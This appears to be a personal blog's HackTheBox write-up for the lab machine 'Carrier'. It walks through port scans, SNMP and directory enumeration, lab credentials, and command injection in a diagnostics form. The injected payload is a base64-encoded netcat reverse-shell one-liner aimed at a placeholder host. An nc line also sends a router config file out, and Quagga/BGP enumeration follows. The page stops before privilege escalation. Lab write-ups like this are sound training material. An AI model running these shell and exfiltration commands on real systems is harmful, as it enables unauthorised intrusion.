@@ -1,0 +1,2212 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DocDock Documentation</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-03-17T19:49:10 EDT">
+<title>Carrier :: DocDock Documentation</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/carrier/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="chickenpwny">ChickenPwny</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/chickenpwny"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item active">
+    <div>
+        <a href="/hackthebox/boxes/carrier/">
+            Carrier
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/devel/">
+            Devel
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/optimum/">
+            Optimum
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/hackthebox/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/help/" class="dd-item
+        ">
+    <div>
+
+        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/bloodhound/" class="dd-item">
+    <div>
+        <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ftp/" class="dd-item">
+    <div>
+        <a href="/tools/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/hydra/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/nmap/" class="dd-item">
+    <div>
+        <a href="/tools/nmap/">
+            Nmap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/smb/smb/" class="dd-item">
+    <div>
+        <a href="/tools/smb/smb/">
+            SMB
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/burp/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+      <option value="/hackthebox/boxes/carrier/"  selected>-- Carrier</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
+    <option value="/hackthebox/boxes/legacy/" >
+  -- 
+   Legacy</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/zipper/" >
+  -- 
+   Zipper</option>
+    <option value="/hackthebox/boxes/oz/" >
+  -- 
+   oz</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+  
+    <option value="/hackthebox/github/" >
+  - 
+   GitHub</option>
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>Carrier</h1>
+    
+    
+    
+    
+
+<h3 id="tcp">TCP</h3>
+
+<pre><code>Nmap 7.70 scan initiated Sat Dec 22 18:11:46 2018 as: nmap -sC -sV -oA carrier-total -T5 -p- 10.10.10.105
+Nmap scan report for carrier.htb (10.10.10.105)                                                                                   
+Host is up (0.14s latency).                                                                                                       
+Not shown: 65532 closed ports                  
+PORT   STATE    SERVICE VERSION
+21/tcp filtered ftp        
+22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:               
+|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
+|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)                                                                   
+|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
+80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
+| http-cookie-flags:           
+|   /:                         
+|     PHPSESSID:               
+|_      httponly flag not set  
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Login            
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+
+<h3 id="udp">UDP</h3>
+
+<pre><code>Nmap 7.70 scan initiated Fri Dec 14 02:02:47 2018 as: nmap -sV -sU -oA udtp-scan -T4 10.10.10.105
+Warning: 10.10.10.105 giving up on port because retransmission cap hit (6).
+Nmap scan report for carrier.htb (10.10.10.105)
+Host is up (0.13s latency).
+Not shown: 988 closed ports
+PORT      STATE         SERVICE       VERSION
+67/udp    open|filtered dhcps
+138/udp   open|filtered netbios-dgm
+161/udp   open          snmp          SNMPv1 server; pysnmp SNMPv3 server (public)
+1041/udp  open|filtered danf-ak2
+3389/udp  open|filtered ms-wbt-server
+17302/udp open|filtered unknown
+18980/udp open|filtered unknown
+19489/udp open|filtered unknown
+30544/udp open|filtered unknown
+36945/udp open|filtered unknown
+49188/udp open|filtered unknown
+64513/udp open|filtered unknown
+</code></pre>
+
+<p><a href="https://chickenpwny.github.io/tools/snmpwalk/">SNMPWalk</a></p>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/snmp_walk.PNG" alt="snmp_walk" /></p>
+
+<pre><code>snmpwalk -v -2c -c public carrier.htb
+</code></pre>
+
+<h3 id="gobuster">GOBUSTER</h3>
+
+<pre><code>/img (Status: 301)
+/index.php (Status: 200)
+/tools (Status: 301)
+/doc (Status: 301)
+/css (Status: 301)
+/js (Status: 301)
+/tickets.php (Status: 302)
+/fonts (Status: 301)
+/dashboard.php (Status: 302)
+/debug (Status: 301)
+/diag.php (Status: 302)
+/server-status (Status: 403)
+</code></pre>
+
+<p>USERNAME = admin</p>
+
+<p>PASSWORD = NET_45JDX23</p>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/login.PNG" alt="login" /></p>
+
+<table>
+<thead>
+<tr>
+<th>45007</th>
+<th>16</th>
+<th align="center">operation failed. Foreign key relationships between federate tables must include the federation key column(s)</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>45009</td>
+<td>16</td>
+<td align="center">operation failed. The operation is not supported on filtering connections</td>
+</tr>
+</tbody>
+</table>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/ewwe.PNG" alt="ewwe" />![mg](C:\Users\charl\OneDri</p>
+
+<p>v<img src="https://chickenpwny.github.io/images/carrier/tools.PNG" alt="tools" /></p>
+
+<h1 id="tickets">Tickets</h1>
+
+<p>1   Closed  Welcome to Lyghtspeed&rsquo;s lightweight telco support system!
+2   Closed  Rx / Mr. White. Says he can&rsquo;t get to &ldquo;the interwebz&rdquo;. Cleared cache/cookie, etc., rebooted PC. Pb fixed.
+3   Open    Rx / Jeremy Paxton. Customer complaining about &ldquo;choke&rdquo; and &ldquo;lags&rdquo; with BoogleGrounds gaming application. Ticket opened with field services to check DSL line. Update 2018/05/30: DSL line checks out OK, sending to IP Core team for further investigation.
+4   Escalated   Rx / Cust #642. Need help setting up Outlook Express on Windows 98. Told customer this platform is no longer supported. Customer has requested an escalation to my manager.
+5   Closed  Rx / LoneWolf7653. User called in to report what is according to him a &ldquo;critical security issue&rdquo; in our demarc equipment. Mentioned something about a CVE (??). Request contact info and sent to legal for further action.
+6   Closed  Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.<sup>17</sup>&frasl;<sub>24</sub>&rsquo;s, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating&hellip; Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually.
+7   Closed  Rx / Pam Dubois. Customer is inquiring about multiple emails received from a &ldquo;Nigerian Prince&rdquo;. Upselled customer our email security mgmt solution.
+8   Open    Rx / Roger (from CastCom): wants to schedule a test of their route filtering policy, asked us to inject one of their routes from our side. He&rsquo;s insisted we tag the route correctly so it is not readvertised to other BGP AS&rsquo;es.</p>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/www-dashboard.PNG" alt="www-dashboard" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/www-dashboard.PNG" alt="www-dashboard" /></p>
+
+<p><img src="docs-diagram.PNG" alt="docs-diagram" /></p>
+
+<p><img src="error-codes.PNG" alt="error-codes" /></p>
+
+<p><img src="error-codes2.PNG" alt="error-codes2" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/www-dashboard-3.PNG" alt="www-dashboard-3" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/www-dashboard-4.PNG" alt="www-dashboard-4" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/www-dashboard-6.PNG" alt="www-dashboard-6" /></p>
+
+<h3 id="user-txt">USER.TXT</h3>
+
+<p>After fuzzing the website for awhile the only thing that seems exploitable was check function/action. After awhile of trial and error I figured out that it needs the initial part then using &amp;&amp; after it will execute the commands</p>
+
+<pre><code>tcpdump -i tun0 icmp
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/carrier/www-dashboard-5.PNG" alt="www-dashboard-5" /></p>
+
+<pre><code>echo 'quagga&amp;&amp;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc CHANGE-ME 9056 &gt;/tmp/f' &gt; shell.b64
+
+base64 -w0 shell.b64
+
+output: base64 -d or decode in burp
+cXVhZ2dhJiZybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyBDSEFOR0UtTUUgOTA1NiA+L3RtcC9mCg
+
+</code></pre>
+
+<p>Active Internet connections (servers and established)<br />
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</p>
+
+<pre><code>tcp        0      0 127.0.0.1:2601          0.0.0.0:*               LISTEN      22420/zebra                           
+tcp        0      0 127.0.0.1:2605          0.0.0.0:*               LISTEN      22424/bgpd                            
+tcp        0      0 0.0.0.0:179             0.0.0.0:*               LISTEN      22424/bgpd                            
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      479/sshd                              
+tcp        0      0 10.78.11.1:179          10.78.11.2:45846        ESTABLISHED 22424/bgpd                            
+tcp        0   3918 10.99.64.2:45600        10.10.14.14:9056        ESTABLISHED 22300/nc                              
+tcp        0      0 10.78.10.1:179          10.78.10.2:33524        ESTABLISHED 22424/bgpd                            
+tcp        0      0 10.99.64.2:22           10.99.64.251:58436      ESTABLISHED 22263/sshd: root@no                   
+tcp        0      0 10.99.64.2:22           10.99.64.251:55234      ESTABLISHED 16732/sshd: root@no                   
+tcp6       0      0 :::179                  :::*                    LISTEN      22424/bgpd                            
+tcp6       0      0 :::22                   :::*                    LISTEN      479/sshd
+</code></pre>
+
+<p>Neat</p>
+
+<p>There are some distinct differences between the openbsd netcat and ubuntu</p>
+
+<p>nc -w 3 10.10.14.14 9058 &lt; zebra.conf</p>
+
+<p>nc -lp  &gt; zebra.conf</p>
+
+<p>show version
+Quagga 0.99.24.1 (Router).
+Copyright 1996-2005 Kunihiro Ishiguro, et al.
+configured with:</p>
+
+<p>show logging
+Syslog logging: disabled
+Stdout logging: disabled
+Monitor logging: level debugging
+File logging: disabled
+Protocol name: ZEBRA
+Record priority: disabled
+Timestamp precision: 0</p>
+
+<h6 id="cat-etc-quagga-bgpd-conf">cat /etc/quagga/bgpd.conf</h6>
+
+<p>!
+! Zebra configuration saved from vty
+!   2018/07/02 02:14:27
+!
+route-map to-as200 permit 10
+route-map to-as300 permit 10
+!
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 route-map to-as300 out
+!
+line vty
+!</p>
+
+<h1 id="sudo-ip-route">sudo ip route</h1>
+
+<pre><code>sudo: unable to resolve host r1: Connection refused
+default via 10.99.64.1 dev eth0 onlink
+10.78.10.0/24 dev eth1  proto kernel  scope link  src 10.78.10.1
+10.78.11.0/24 dev eth2  proto kernel  scope link  src 10.78.11.1
+
+10.99.64.0/24 dev eth0  proto kernel  scope link  src 10.99.64.2
+</code></pre>
+
+<pre><code>zebra.conf
+zebra.conf.orig
+zebra.conf.sav
+</code></pre>
+
+<pre><code>cp zebra.conf.orig zebra.conf
+
+telnet localhost 2601 -l zebra
+</code></pre>
+
+<h2 id="netstat-rn">netstat -rn</h2>
+
+<p>Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         10.99.64.1      0.0.0.0         UG        0 0          0 eth0</p>
+
+<h2 id="sudo-vtysh-c-show-ip-route">sudo vtysh -c &ldquo;show ip route&rdquo;</h2>
+
+<p>sudo: unable to resolve host r1: Connection refused
+Codes: K - kernel route, C - connected, S - static, R - RIP,
+​       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel,
+​       &gt; - selected route, * - FIB route</p>
+
+<p>K&gt;* 0.0.0.0/0 via 10.99.64.1, eth0
+C&gt;* 10.78.10.0/24 is directly connected, eth1
+C&gt;* 10.78.11.0/24 is directly connected, eth2
+C&gt;* 10.99.64.0/24 is directly connected, eth0
+C&gt;* 127.0.0.0/8 is directly connected, lo</p>
+
+<h1 id="sudo-vtysh-c-show-ip-bgp">sudo vtysh -c &ldquo;show ip bgp&rdquo;</h1>
+
+<p>sudo: unable to resolve host r1: Connection refused
+BGP table version is 0, local router ID is 10.255.255.1
+Status codes: s suppressed, d damped, h history, * valid, &gt; best, = multipath,
+​              i internal, r RIB-failure, S Stale, R Removed
+Origin codes: i - IGP, e - EGP, ? - incomplete</p>
+
+<p>Network          Next Hop            Metric LocPrf Weight Path
+*&gt; 10.78.10.0/24    0.0.0.0                  0         32768 ?
+*&gt; 10.78.11.0/24    0.0.0.0                  0         32768 ?
+*&gt; 10.99.64.0/24    0.0.0.0                  0         32768 ?
+*&gt; 10.101.8.0/21    0.0.0.0                  0         32768 i
+*&gt; 10.101.16.0/21   0.0.0.0                  0         32768 i</p>
+
+<p>to view route tables inside quagga</p>
+
+<p><a href="https://www.nongnu.org/quagga/docs/docs-multi/Static-Route-Commands.html">https://www.nongnu.org/quagga/docs/docs-multi/Static-Route-Commands.html</a></p>
+
+<h1 id="show-ip-route">show ip route</h1>
+
+<p>Codes: K - kernel route, C - connected, S - static, R - RIP,
+​       O - OSPF, I - IS-IS, B - BGP, P - PIM, A - Babel,
+​       &gt; - selected route, * - FIB route</p>
+
+<p>K&gt;* 0.0.0.0/0 via 10.99.64.1, eth0
+C&gt;* 10.78.10.0/24 is directly connected, eth1
+C&gt;* 10.78.11.0/24 is directly connected, eth2
+C&gt;* 10.99.64.0/24 is directly connected, eth0
+B&gt;* 10.100.10.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.11.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.12.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.13.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.14.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.15.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.16.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.17.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.18.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.19.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.100.20.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.10.2, eth1, 00:06:18
+B&gt;* 10.120.10.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.11.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.12.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.13.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.14.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.15.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.16.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.17.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.18.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
+B&gt;* 10.120.19.0/24 [<sup>20</sup>&frasl;<sub>0</sub>] via 10.78.11.2, eth2, 00:06:16
